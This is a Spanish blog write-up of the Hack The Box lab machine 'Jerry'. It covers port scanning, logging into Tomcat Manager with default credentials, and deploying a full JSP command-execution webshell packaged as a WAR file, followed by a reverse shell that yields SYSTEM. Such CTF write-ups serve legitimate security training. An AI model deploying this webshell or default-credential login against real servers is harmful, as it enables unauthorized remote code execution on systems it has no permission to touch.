---
layout: post
title: Hack The Box Jerry Write-Up
date: 2025-01-24
categories: [Write-Ups, HackTheBox, Machine, Easy]
tags: [Easy, Tomcat RCE]
image: /assets/post_details/jerry/jerry_front_image.png
---
# Hack The Box: Jerry Write-Up
La **maquina easy** [Jerry](https://app.hackthebox.com/machines/Jerry) de [Hack The Box](https://app.hackthebox.com/) trata de una enumeración por el protocolo http, encontrando así un Tomcat configurado con credenciales comunes o por defecto, llevando así a poder tomar el privilegio mediante un RCE.

## Enumeration
Realizamos la enumeración de puertos y de servicios, encontramos el puerto 8080 abierto, en el corre el servicio **Tomcat**, el cual es un servidor web de código abierto y un contenedor de servlets desarrollado por la Apache Software Foundation. Es una de las implementaciones más populares de las tecnologías **Java Servlet**, **JavaServer Pages (JSP)** y **Java Expression Language (EL)**, este permite ejecutar aplicaciones web en **Java**.
```bash
nmap -p8080 -sCV -n -Pn 10.10.10.95 -oN full_scan.txt
```
![nmap](/assets/post_details/jerry/jerry_nmap_enum.png)
### HTTP - 8080
Nos encontramos con la pagina por defecto, uno de los posibles vectores de ataque es entrar al `Application Manager` para esto necesitaremos credenciales.
![default page](/assets/post_details/jerry/jerry_default_page.png)
## Tomcat RCE via jsp file
### Get Credentials
Al darle en el boton `Host Manager` y realizar unos intentos fallidos, nos redirige a esta pagina de error, en la que nos muestra estas credenciales por defecto.
![default creeds](/assets/post_details/jerry/jerry_default_creeds.png)

Utilizamos estas credenciales por defecto para loguearnos en el `Tomcat Web Application Manager`, en el que podemos lanzar un **RCE** realizando una webshell, en este [repo](https://github.com/simran-sankhala/Pentest-Tomcat) esta explicado.
![tomcat web application manager](/assets/post_details/jerry/jerry_tomcat_web_application_manager.png)
### Making file
Debemos de crearnos un fichero `index.jsp`, los ficheros **JavaServer Pages (JSP)** es una tecnología que ayuda a los desarrolladores de software a crear páginas web dinámicas basadas en HTML y XML, entre otros tipos de documentos, se utiliza java para programarlos. En este caso `index.jsp` contendra una webshell, que desde el navegador podremos lanzar comandos.
```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

Debemos de pasar el fichero **jsp** a **war** ya que nos lo pide la aplicación web, los ficheros **war** son una aplicación Web empaquetada.
```bash
> mkdir webshell
> cp index.jsp webshell
> cd webshell
> jar -cvf ../webshell.war *
```
### Dropping RCE
Subimos el archivo y realizamos el **Deploy** del archivo, el cual estara listado en `Applications` en el `dashboard`.
![war file](/assets/post_details/jerry/jerry_upload_war_file.png)

En el nos lanzamos una **revshell** de [revshells](https://www.revshells.com/), una powershell en base64, y teniendo un listener obtenemos la shell.
![webshell](/assets/post_details/jerry/jerry_webshell_powershell.png)
### GetSystem
Obtenemos la shell como **nt authority\system** usuario con mayor privilegio en el sistema, nos quedaria obtener las dos flags.
![getsystem](/assets/post_details/jerry/jerry_getsystem.png)
